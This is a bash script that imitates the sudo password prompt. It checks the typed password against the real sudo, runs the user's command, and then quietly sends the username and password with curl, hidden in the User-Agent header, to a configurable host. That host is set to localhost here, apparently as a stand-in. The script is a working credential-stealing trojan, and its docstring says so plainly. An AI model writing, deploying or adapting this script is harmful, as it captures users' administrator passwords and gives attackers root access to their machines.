#!/bin/bash

"""
This script first checks if any options are given when the script is run. 
If none are given, it shows the usage for the `sudo` command and exits with a non-zero status to indicate an error. 
If the option `-h` is given, it shows the help for the `sudo` command and exits with a zero status to indicate success.
Next, the script checks if the user has a valid `sudo` session. 
If the user does have a valid session, the script runs the command passed as an argument with `sudo` and exits with the same status as the command run with `sudo`. 
If the user does not have a valid session, the script prompts the user to enter their password and performs a maximum of 3 attempts to check if the entered password is correct. 
If the user reaches the maximum number of attempts without entering the correct password, the script exits with a non-zero status to indicate an error.
The script also captures the locale language and sends a curl request to the host, logging the username and password entered by the user. 
Finally, the script exits with a zero status to indicate success.
"""

# Set the HOST variable to localhost
HOST=localhost

# Show usage if no options are given
if [ "$#" -eq 0 ]; then
  # If no options are given, show the usage for the sudo command
  /usr/bin/sudo -l
  # Exit the script with a non-zero status to indicate an error
  exit 1
elif [ "$1" == "-h" ]; then
  # If the option -h is given, show the help for the sudo command
  /usr/bin/sudo -h
  # Exit the script with a zero status to indicate success
  exit 0
fi

# Check if user has a valid sudo session
/usr/bin/sudo -n true 2>/dev/null
# Check the exit status of the previous command
if [ $? -eq 0 ]; then
  # If the exit status is zero, the user has a valid sudo session
  # Run the command passed as argument with sudo
  /usr/bin/sudo "$@"
  # Exit the script with the same status as the command run with sudo
  exit $?
fi

# Get the locale language
LANG=$(locale | grep 'LANG=' | cut -d'=' -f2)

# Set the prompt message
prompt_msg="[sudo] password for $(whoami) :"
# Set the message to show when the password is incorrect
fail_msg="Sorry, try again."
# Set the message to show when the user reaches the maximum number of attempts
incorrect_msg="incorrect password attempts"

# Set the number of attempts to zero
attempts=0

# Show the number of incorrect attempts when the user hits Ctrl-C
trap 'echo; if [ "$attempts" -ne 0 ]; then echo "sudo: "$attempts" "$incorrect_msg; fi; exit 1' INT

# Loop until the user enters the correct password or reaches the maximum number of attempts
while [ "$attempts" -le 2 ]; do
  # Show the prompt message
  echo -en "$prompt_msg"
  # Read the password entered by the user and hide it
  read -s passwd
  echo
  # Increment the number of attempts
  attempts=$((attempts+1))
  # Check if the entered password is correct
  echo $passwd | /usr/bin/sudo -S true > /dev/null 2>&1
  result=$?
  if [ "$result" -eq 1 ]; then
    # If the password is incorrect
    if [ "$attempts" -eq 3 ]; then
      # If the user reached the maximum number of attempts
      echo "sudo: "$attempts" "$incorrect_msg
      # Exit the script with a non-zero status to indicate an error
      exit 1
    else
      # Show the fail message
      echo $fail_msg
    fi
  elif [ "$result" -eq 0 ]; then
    # If the password is correct
    # Run the command passed as argument with sudo
    echo $passwd | /usr/bin/sudo -S "$@"
    # Exit the loop
    break
  fi
done

# Send a curl request to the host and log the username and password
curl -s -A "$(echo "Username: $(whoami ) - Password: $passwd")" $HOST > /dev/null 2>&1

#Exit the script with a zero status to indicate success

exit 0